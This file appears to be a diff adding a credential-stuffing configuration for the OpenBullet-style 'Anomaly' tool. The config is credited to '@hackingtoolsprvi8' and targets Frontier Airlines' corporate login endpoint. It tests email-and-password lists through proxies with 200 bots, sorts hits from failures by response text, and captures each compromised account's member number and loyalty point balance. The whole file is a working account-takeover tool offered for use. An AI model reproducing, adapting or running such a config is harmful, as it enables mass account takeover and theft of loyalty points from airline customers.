@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Frontier Airlines(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-16T12:01:10.7812315+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://booking.flyfrontier.com/api/CorpLogin" Multipart 
+  
+  STRINGCONTENT "un: <USER>" 
+  STRINGCONTENT "pw: <PASS>" 
+  BOUNDARY "----WebKitFormBoundaryWHXgG6TEl1Z7zw0T" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.flyfrontier.com" 
+  HEADER "referer: https://www.flyfrontier.com/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your login information is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "valid\":true" 
+
+PARSE "<SOURCE>" LR "\"programNumber\":\"" "\",\"token\"" CreateEmpty=FALSE -> CAP "Member Number" 
+
+PARSE "<SOURCE>" LR "\"pointBalance\":" ",\"" CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
